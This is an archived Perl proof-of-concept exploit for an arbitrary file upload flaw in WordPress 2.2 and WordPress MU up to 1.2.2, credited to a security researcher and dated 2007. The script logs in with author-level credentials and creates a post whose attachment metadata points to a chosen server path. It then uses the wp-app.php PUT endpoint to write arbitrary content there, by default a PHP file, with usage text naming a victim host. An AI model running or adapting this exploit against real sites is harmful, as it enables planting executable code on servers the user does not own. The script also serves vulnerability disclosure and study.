<html><head><title>WordPress 2.2 (wp-app.php) Arbitrary File Upload Exploit</title></head><pre>#! /usr/bin/env perl

# Wordpress 2.2 and Wordpress MU &lt;= 1.2.2 Arbitrary File Upload PoC
#
# Credits : Alexander Concha &lt;alex at buayacorp dot com&gt;
# Website : http://www.buayacorp.com/
# Advisory: http://www.buayacorp.com/files/wordpress/wordpress-advisory.html

use Digest::MD5 qw(md5_hex);
use LWP::UserAgent;

my $ua = new LWP::UserAgent;
my $blog        = $ARGV[0];
my $user        = $ARGV[1];
my $pass        = $ARGV[2];
my $remote_file = $ARGV[3];
my $local_file  = $ARGV[4];
my $post_id     = $ARGV[5];

if (@ARGV &lt; 4) {
       print &quot;\nUsage:\n&quot;;
       print &quot; wp-file-upload.pl &lt;host&gt; &lt;username&gt; &lt;password&gt; &lt;remote_filename&gt; [local_file] [post_id]\n\n&quot;;
       print &quot; &lt;host&gt;        - full path to WordPress. http://victim.com/wordpress/\n&quot;;
       print &quot; &lt;username&gt;    - valid username with any of these roles: author, editor, administrator\n&quot;;
       print &quot; &lt;password&gt;    - valid password for the user\n&quot;;
       print &quot; &lt;remote_file&gt; - full path to the remote file. /home/vulnerable.com/wordpress/wp-content/uploads/foo.php\n&quot;;
       print &quot; [local_file]  - file to upload\n&quot;;
       print &quot; [post_id]     - every time this script is executed creates a new post, specify a post_ID if you already run it\n\n&quot;;
       exit();
}
$ua-&gt;requests_redirectable([]);
$blog =~ s/\/*$/\//;

$url = 'wp-app.php';
if ( 200 != $ua-&gt;head($url . '?action=/service')-&gt;code ) {
       $url = 'app.php';
       die &quot;\nIt seems that this WP installation is not vulnerable: app.php and wp-app.php were not found.\n&quot;
               unless 200 == $ua-&gt;head($url . '?action=/service')-&gt;code;
}

$auth_cookie = get_auth_cookie();

sub LWP::UserAgent::simple_request {
       my($self, $request, $arg, $size) = @_;
       $request-&gt;header('Cookie' =&gt; $auth_cookie);
       $request-&gt;content_type('image/gif') if $request-&gt;method eq &quot;PUT&quot;;
       $request-&gt;uri($blog . $request-&gt;uri);

       $self-&gt;_request_sanity_check($request);
       my $new_request = $self-&gt;prepare_request($request);
       $response = $self-&gt;send_request($new_request, $arg, $size);

       print $request-&gt;method . &quot; &quot; . $request-&gt;uri . &quot; &quot; . $response-&gt;code . &quot;\n&quot;;

       return $response;
}

sub get_contents {
       $file = shift;
       if ( -e $file ) {
               open FILE, $file or die(&quot;Invalid local file&quot;);
               $file = join('', &lt;FILE&gt;);
               close FILE;
       } else {
               $file = &lt;&lt;PHP;
&lt;?php echo &quot;Hello World!&quot;; ?&gt;
PHP
       }
       return $file;
}
sub get_auth_cookie {
       $response = $ua-&gt;head('wp-login.php?logout');
       if ( $response-&gt;headers-&gt;header('Set-Cookie') =~ m/wordpress(user|pass)(.*?)=/ ) {
                       return &quot;wordpressuser$2=$user;wordpresspass$2=&quot;.md5_hex(md5_hex($pass));
       }
       return '';
}
if (0 == $post_id) {
       $response = $ua-&gt;get('wp-admin/post-new.php');
       die (&quot;\nInvalid credentials or blog url.\n\n&quot; . $response-&gt;as_string) unless 200 == $response-&gt;code;

       if ( $response-&gt;content =~ m/name=._wpnonce. value=.([a-z\d]{10})./ ) {
               $response = $ua-&gt;post('wp-admin/post.php', [
                       '_wpnonce' =&gt; $1,
                       'action' =&gt; 'post',
                       'post_ID' =&gt; $post_id,
                       'post_type' =&gt; 'post',
                       'post_title' =&gt; 'foo',
                       'metakeyselect' =&gt; '#NONE#',
                       'metakeyinput' =&gt; '_wp_attached_file',
                       'metavalue' =&gt; $remote_file
                       ], 'Cookie' =&gt; $auth_cookie);

               # Checks for post-new.php?posted=post_ID
               if ( $response-&gt;headers-&gt;header('Location') =~ m/posted=(\d+)/ ) {
                       $post_id = $1;
               }
       }
}
die &quot;\nCould not get a valid post_id value.\n&quot; unless 0 != $post_id;

$request = HTTP::Request-&gt;new(PUT =&gt; $url . '?action=/attachment/file/'.$post_id);
$request-&gt;content(get_contents($local_file));
$response = $ua-&gt;request($request);

if ( 200 == $response-&gt;code ) {
       print &quot;\nIt seems that the file has been posted successfully... :P\n&quot;;
       print &quot;Use the following value to update the remote file: post_id '$post_id'\n&quot;;
} else {
       print &quot;\nError: there is no attachment metadata for post_id=$post_id\n\n&quot; . $response-&gt;as_string() . &quot;\n&quot;;
}

# milw0rm.com [2007-06-26]</pre></html>